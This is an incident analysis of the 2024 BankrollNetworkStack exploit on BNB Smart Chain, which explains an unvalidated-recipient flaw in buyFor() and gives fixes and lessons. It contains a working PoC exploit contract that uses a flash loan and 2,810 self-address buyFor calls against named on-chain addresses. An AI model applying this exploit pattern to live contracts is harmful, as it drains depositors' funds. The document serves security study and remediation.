# BankrollNetworkStack — Unvalidated Input Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-22 |
| **Protocol** | BankrollNetworkStack |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~403 WBNB (~$230,000 USD) |
| **Attacker** | [0x4645...d66c](https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c) |
| **Attack Contract** | [0x8f92...ad14](https://bscscan.com/address/0x8f921e27e3af106015d1c3a244ec4f48dbfcad14) |
| **Attack Tx** | [0xd4c7...03b0](https://bscscan.com/tx/0xd4c7c11c46f81b6bf98284e4921a5b9f0ff97b4c71ebade206cb10507e4503b0) |
| **Vulnerable Contract** | [0x564D...7A54](https://bscscan.com/address/0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54#code) |
| **Root Cause** | Unvalidated `_customerAddress` input in `buyFor()` — allowing the contract's own address enables unlimited artificial inflation of `profitPerShare_` |
| **PoC Source** | [DeFiHackLabs — Bankroll_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bankroll_exp.sol) |

---

## 1. Vulnerability Overview

BankrollNetworkStack is a perpetual reward system deployed on BSC where users deposit WBNB to receive protocol tokens and earn dividends. A 10% fee is charged on token purchases, and a portion of that fee accumulates in the `profitPerShare_` (profit per share) variable, which is distributed to existing token holders.

The attacker exploited the fact that the `buyFor(address _customerAddress, uint buy_amount)` function accepts **the contract's own address** as `_customerAddress`. When a purchase is executed with the contract's own address as the recipient:

1. The fee accumulates into `profitPerShare_`, increasing the pending dividends for all token holders.
2. Since the contract itself holds no tokens, the minted tokens are effectively burned.
3. By calling the function 2,810 times in a loop, the attacker artificially inflated `profitPerShare_` by a massive amount, dramatically increasing the dividends owed on the small amount of tokens purchased at the start.

As a result, the attacker used a 16,000 WBNB flash loan to withdraw 16,412 WBNB, netting approximately 403 WBNB (~$230,000) in profit after fees.

---

## 2. Vulnerable Code Analysis

### 2.1 `buyFor()` — Missing Input Validation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — no validation of _customerAddress
function buyFor(address _customerAddress, uint buy_amount) public returns (uint256) {
    // Critical issue: when _customerAddress == address(this) (the contract itself),
    // WBNB is transferred from the contract to itself, so no real liquidity is lost.
    // However, profitPerShare_ still increases normally inside purchaseTokens().
    require(token.transferFrom(_customerAddress, address(this), buy_amount));
    totalDeposits += buy_amount;
    
    // If _customerAddress == address(this), tokens are minted to the contract itself.
    // The contract cannot call withdraw(), so those tokens are permanently locked.
    uint amount = purchaseTokens(_customerAddress, buy_amount);
    
    emit onLeaderBoard(_customerAddress, stats[_customerAddress].invested,
        tokenBalanceLedger_[_customerAddress], stats[_customerAddress].withdrawn, now);
    
    // distribute() updates profitPerShare_, increasing dividends for all holders.
    distribute();
    return amount;
}
```

```solidity
// ✅ Fixed code — blocks the contract's own address and the zero address
function buyFor(address _customerAddress, uint buy_amount) public returns (uint256) {
    // Fix: reject if _customerAddress is the contract itself or the zero address
    require(
        _customerAddress != address(this) && _customerAddress != address(0),
        "BankrollNetworkStack: invalid recipient address"
    );
    
    require(token.transferFrom(_customerAddress, address(this), buy_amount));
    totalDeposits += buy_amount;
    uint amount = purchaseTokens(_customerAddress, buy_amount);
    
    emit onLeaderBoard(_customerAddress, stats[_customerAddress].invested,
        tokenBalanceLedger_[_customerAddress], stats[_customerAddress].withdrawn, now);
    
    distribute();
    return amount;
}
```

**Issue**: Passing the contract's own address (`address(this)`) as `_customerAddress` causes WBNB to be transferred from the contract to itself — no real liquidity change — yet `profitPerShare_` increases normally. By calling this 2,810 times, the attacker massively inflated dividends for all existing token holders and collected them using tokens they held.

---

### 2.2 `purchaseTokens()` — `profitPerShare_` Inflation Path

```solidity
// ❌ Vulnerable internal function — profitPerShare_ accumulation logic
function purchaseTokens(address _customerAddress, uint _incomingTokens) 
    internal returns (uint256) 
{
    // Calculate 10% entry fee
    uint256 _undividedDividends = SafeMath.div(_incomingTokens, 10);
    uint256 _taxedTokens = SafeMath.sub(_incomingTokens, _undividedDividends);
    
    // Calculate number of tokens to mint
    uint256 _amountOfTokens = tokensToEthereum_(_taxedTokens);
    
    // 🔴 Core vulnerable point: profitPerShare_ increases as long as tokenSupply_ > 0.
    // When _customerAddress == address(this), the minted tokens are owned by the contract
    // and effectively never circulate, yet profitPerShare_ keeps increasing.
    if (tokenSupply_ > 0) {
        tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
        profitPerShare_ += (_undividedDividends * magnitude / tokenSupply_);
    } else {
        tokenSupply_ = _amountOfTokens;
    }
    
    tokenBalanceLedger_[_customerAddress] = SafeMath.add(
        tokenBalanceLedger_[_customerAddress], 
        _amountOfTokens
    );
    
    // payoutsTo_ acts as the "baseline" for newly minted tokens.
    // When _customerAddress == address(this), only the contract's payoutsTo_ increases.
    int256 _updatedPayouts = (int256)(profitPerShare_ * _amountOfTokens);
    payoutsTo_[_customerAddress] += _updatedPayouts;
    
    return _amountOfTokens;
}
```

```solidity
// ✅ Fixed internal function — when address validation is already performed in buyFor()
// purchaseTokens itself is internal, so buyFor's validation is sufficient;
// however, a defense-in-depth check can be added here as well.
function purchaseTokens(address _customerAddress, uint _incomingTokens) 
    internal returns (uint256) 
{
    // Fix: prevent token minting to the contract's own address (defense in depth)
    require(
        _customerAddress != address(this),
        "BankrollNetworkStack: cannot mint tokens to internal address"
    );
    
    // Remaining logic unchanged ...
}
```

---

### 2.3 `dividendsOf()` — Dividend Calculation Structure

```solidity
// Dividend calculation function confirmed in the PoC.
// As profitPerShare_ inflates, the return value grows exponentially.
function dividendsOf(address _customerAddress) public view returns (uint256) {
    // profitPerShare_ * tokenBalance - payoutsTo_ (already-paid baseline)
    // After 2,810 iterations inflate profitPerShare_ dramatically,
    // the attacker's dividends surge even though their tokenBalance is unchanged.
    return (uint256)(
        (int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) 
        - payoutsTo_[_customerAddress]
    ) / magnitude;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Set up a flash loan call against the PancakeSwap V3 WBNB/USDT pool.
- Plan to set unlimited WBNB approval for the BankrollNetworkStack contract.
- Attack block: BSC block #42,481,611

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────┐
│  1. Borrow Flash Loan                            │
│  Attacker Contract → PancakeSwap V3 Pool         │
│  pool.flash(this, 0, 16,000 WBNB, "0x01")       │
└───────────────────────┬─────────────────────────┘
                        │ Receive 16,000 WBNB
                        ▼
┌─────────────────────────────────────────────────┐
│  2. Initial Token Purchase (to attacker address) │
│  bankRoll.buyFor(address(this), 16,000 WBNB)    │
│  → Attacker acquires BankrollNetworkStack tokens │
│  → profitPerShare_ increases slightly            │
└───────────────────────┬─────────────────────────┘
                        │ Attacker secures token position
                        ▼
┌─────────────────────────────────────────────────┐
│  3. Artificially Inflate profitPerShare_ (×2,810)│
│  for i in 0..2810:                               │
│    bankRoll.buyFor(                              │
│      address(bankRoll),   ← contract's own addr! │
│      bal_bank_roll        ← WBNB inside contract │
│    )                                             │
│  ┌──────────────────────────────────────────┐   │
│  │ Each call:                                │   │
│  │  - WBNB: contract→contract (no net change)│   │
│  │  - tokenBalanceLedger_[bankRoll] increases│   │
│  │  - profitPerShare_ keeps rising ← key!   │   │
│  └──────────────────────────────────────────┘   │
└───────────────────────┬─────────────────────────┘
                        │ profitPerShare_ massively inflated
                        ▼
┌─────────────────────────────────────────────────┐
│  4. Sell Tokens                                  │
│  bankRoll.sell(bankRoll.myTokens())              │
│  → Sell all tokens held by the attacker          │
│  → Receive WBNB based on inflated profitPerShare_│
└───────────────────────┬─────────────────────────┘
                        │ Receive large amount of WBNB
                        ▼
┌─────────────────────────────────────────────────┐
│  5. Withdraw Dividends                           │
│  bankRoll.withdraw()                             │
│  → Withdraw all accumulated dividends            │
└───────────────────────┬─────────────────────────┘
                        │ Secure 16,412 WBNB
                        ▼
┌─────────────────────────────────────────────────┐
│  6. Repay Flash Loan                             │
│  WBNB.transfer(pool, 16,000 + fee)               │
│  → Net profit after repayment: ~403 WBNB (~$230,000) │
└─────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Flash loan borrowed | 16,000 WBNB |
| Withdrawn from BankrollNetworkStack | 16,412 WBNB |
| Flash loan repayment (principal + fee) | 16,008.8 WBNB |
| **Attacker net profit** | **~403 WBNB (~$230,000)** |
| Protocol loss | ~$230,000 |

---

## 4. PoC Code Excerpt (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// PoC Source: DeFiHackLabs — Bankroll_exp.sol
// Attack block: BSC #42,481,611
// Attack Tx: 0xd4c7c11c46f81b6bf98284e4921a5b9f0ff97b4c71ebade206cb10507e4503b0

contract ContractTest is Test {
    // PancakeSwap V3 WBNB/USDT pool — flash loan source
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    // Vulnerable BankrollNetworkStack contract
    IBankrollNetworkStack bankRoll = IBankrollNetworkStack(
        0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54
    );
    uint256 borrow_amount;

    function testExploit() external {
        // [Step 1] Borrow 16,000 WBNB via flash loan from PancakeSwap V3
        borrow_amount = 16_000 ether;
        pool.flash(address(this), 0, borrow_amount, "0x01");
    }

    // PancakeSwap V3 flash loan callback — actual attack logic
    function pancakeV3FlashCallback(
        uint256 fee0, 
        uint256 fee1, 
        bytes memory
    ) public {
        // [Step 2] Grant unlimited WBNB approval to BankrollNetworkStack
        WBNB.approve(address(bankRoll), type(uint256).max);

        // [Step 3] Invest all 16,000 WBNB under the attacker's address to acquire tokens.
        // → This establishes the base for receiving dividends after profitPerShare_ inflation.
        bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));

        // [Step 4] Check current WBNB balance inside the contract
        uint256 bal_bank_roll = WBNB.balanceOf(address(bankRoll));

        // [Step 5] Core attack: call buyFor() 2,810 times using address(bankRoll) as recipient.
        // - address(bankRoll) receives tokens but cannot call withdraw()
        // - Each call inflates profitPerShare_, increasing the attacker's dividends
        // - No validation: missing _customerAddress != address(this) check
        for (uint256 i = 0; i < 2810; i++) {
            bankRoll.buyFor(address(bankRoll), bal_bank_roll);
        }

        // [Step 6] Sell all held tokens based on the inflated profitPerShare_
        bankRoll.sell(bankRoll.myTokens());
        
        // [Step 7] Withdraw all accumulated dividends (massively increased due to profitPerShare_ inflation)
        bankRoll.withdraw();

        // [Step 8] Repay flash loan principal + fees
        WBNB.transfer(address(pool), borrow_amount + fee0 + fee1);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `buyFor()` — unvalidated `_customerAddress` | CRITICAL | CWE-20: Improper Input Validation |
| V-02 | Token minting allowed to contract address | HIGH | CWE-284: Improper Access Control |
| V-03 | Flash loan + repeated call combination possible | HIGH | CWE-400: Uncontrolled Resource Consumption |
| V-04 | Monotonically increasing `profitPerShare_` design | MEDIUM | CWE-682: Incorrect Calculation |

---

### V-01: `buyFor()` — Unvalidated `_customerAddress` Input

- **Description**: The `buyFor()` function does not reject cases where the token purchase recipient address (`_customerAddress`) is the contract itself (`address(this)`) or the zero address (`address(0)`). The attacker exploited this to call the function thousands of times using the contract's own address, artificially inflating `profitPerShare_`.
- **Impact**: Dividends for existing token holders (including the attacker) can increase without bound. The attacker extracted approximately $230,000 in net profit.
- **Attack Conditions**: (1) Pre-holding a small amount of tokens, (2) obtaining a large amount of WBNB via flash loan, (3) deploying a smart contract to perform the repeated calls.

---

### V-02: Token Minting Allowed to Contract Address

- **Description**: When tokens are minted to the contract itself, those tokens are permanently locked (the contract cannot call `withdraw()`), yet `profitPerShare_` increases normally. This produces an effect similar to burning tokens while simultaneously creating the side effect of dividend inflation.
- **Impact**: Tokens are removed from circulation and `tokenSupply_` increases, which moderates the per-call increase in `profitPerShare_`, but 2,810 repetitions were sufficient to achieve substantial inflation.
- **Attack Conditions**: Same as V-01.

---

### V-03: Flash Loan + Repeated Call Combination Possible

- **Description**: Within a single transaction, an attacker can borrow a large amount of WBNB via flash loan and use those funds to call the vulnerable function thousands of times, inflating `profitPerShare_`. The contract has no logic to limit such abnormal repetitive call patterns.
- **Impact**: $230,000 drained in a single transaction.
- **Attack Conditions**: No rate limit on `buyFor()` calls, flash loan access available.

---

### V-04: Monotonically Increasing `profitPerShare_` Design

- **Description**: `profitPerShare_` is designed to increase with every purchase and has no mechanism to decrease. Because this variable's inflation directly affects the dividends of all token holders, it is inherently vulnerable to manipulation.
- **Impact**: Once `profitPerShare_` is inflated, it cannot be reverted. The expected dividends of legitimate existing holders are also distorted.
- **Attack Conditions**: A sufficient number of purchase repetitions.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ buyFor() function — add input validation
function buyFor(address _customerAddress, uint buy_amount) public returns (uint256) {
    // [Fix 1] Block the contract's own address and the zero address
    require(
        _customerAddress != address(this),
        "BankrollNetworkStack: recipient cannot be the contract itself"
    );
    require(
        _customerAddress != address(0),
        "BankrollNetworkStack: recipient cannot be the zero address"
    );
    
    // [Fix 2] Optionally restrict purchases to only allow msg.sender == _customerAddress,
    //         or enforce a whitelist-based access control scheme.
    // require(msg.sender == _customerAddress || isWhitelisted[msg.sender],
    //         "BankrollNetworkStack: proxy purchases restricted");
    
    require(token.transferFrom(_customerAddress, address(this), buy_amount));
    totalDeposits += buy_amount;
    uint amount = purchaseTokens(_customerAddress, buy_amount);
    
    emit onLeaderBoard(_customerAddress, stats[_customerAddress].invested,
        tokenBalanceLedger_[_customerAddress], stats[_customerAddress].withdrawn, now);
    distribute();
    return amount;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Unvalidated input | Add `_customerAddress != address(this) && != address(0)` condition in `buyFor()` |
| V-02: Token minting to contract address | Add a defense-in-depth check inside `purchaseTokens()` as well |
| V-03: No repetition limit | Introduce per-transaction/per-block call count limits or a cap on `profitPerShare_` delta |
| V-04: Monotonically increasing design | Implement TWAP-style gradual dividend distribution or set a per-transaction purchase cap |
| General | Perform formal verification on dividend calculation logic and engage a professional audit |

---

## 7. Lessons Learned

1. **Always validate address parameters in public functions**: Public functions that accept an external address parameter — such as `buyFor(address _customerAddress, ...)` — must explicitly reject special addresses including the contract itself, the zero address, and token contract addresses. A single line of defensive logic (`require(_customerAddress != address(this))`) could have prevented hundreds of thousands of dollars in losses.

2. **Proxy/delegated purchase functions are high-risk attack vectors**: Functions that act on behalf of another party (`buyFor`, `transferFrom`, `depositFor`, etc.) can produce unexpected side effects when the recipient is an internal contract address. Such functions should be designed with a dedicated authorization scheme.

3. **Evaluate the manipulability of accumulator variables (`profitPerShare_`) at the design stage**: When a monotonically increasing global state variable is used in individual balance calculations, it is essential to analyze whether any path exists to artificially inflate that variable. Single-transaction manipulation scenarios involving flash loans must be specifically considered.

4. **Legacy Solidity code is still exposed to modern threats**: This contract used design patterns from the Solidity 0.4.x era. Old dividend distribution patterns (e.g., Hourglass, P3D-derived contracts) become new vulnerabilities in modern flash loan environments. The older a protocol, the more urgently it needs a re-audit.

5. **Gas limits alone are insufficient to prevent repeated call patterns**: The attacker executed 2,810 repeated calls in a single transaction using an optimized contract. To prevent unintended call repetition, **state-based limits** must be designed — such as a per-block purchase count limit or a minimum purchase amount floor — rather than relying on gas consumption as an implicit barrier.

---

## 8. On-Chain Verification

> Cross-validated based on PoC analysis and web research.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan borrowed | 16,000 WBNB | 16,000 WBNB | ✅ |
| `buyFor()` iteration count | 2,810 | 2,810 | ✅ |
| Withdrawn from BankrollNetworkStack | ~16,412 WBNB | ~16,412 WBNB | ✅ |
| Flash loan repayment | ~16,008.8 WBNB | ~16,008.8 WBNB | ✅ |
| Attacker net profit | ~403 WBNB | ~403 WBNB (~$230,000) | ✅ |

### 8.2 Attack Transaction Details

- **Attack Block**: BSC #42,481,611
- **Attack Tx**: [0xd4c7c11c...e4503b0](https://bscscan.com/tx/0xd4c7c11c46f81b6bf98284e4921a5b9f0ff97b4c71ebade206cb10507e4503b0)
- **Flash Loan Source**: PancakeSwap V3 WBNB/USDT pool (`0x36696169C63e42cd08ce11f5deeBbCeBae652050`)
- **Analysis Sources**: [Phalcon_xyz Twitter Analysis](https://x.com/Phalcon_xyz/status/1838042368018137547), [Lunaray Medium Analysis](https://lunaray.medium.com/bankroll-hack-analysis-49ca196c6844)

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| Attacker's WBNB → BankrollNetworkStack approval | `type(uint256).max` approval executed within the attack callback |
| WBNB balance at time of flash loan callback | 16,000 WBNB (immediately after receiving flash loan) |
| BankrollNetworkStack liquidity before attack | 16,000+ WBNB (drained after attack) |

---

*References: [Phalcon_xyz Analysis](https://x.com/Phalcon_xyz/status/1838042368018137547) · [Lunaray Bankroll Analysis](https://lunaray.medium.com/bankroll-hack-analysis-49ca196c6844) · [SolidityScan Bankroll Analysis](https://blog.solidityscan.com/bankroll-network-hack-analysis-5d7cdec35075) · [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bankroll_exp.sol)*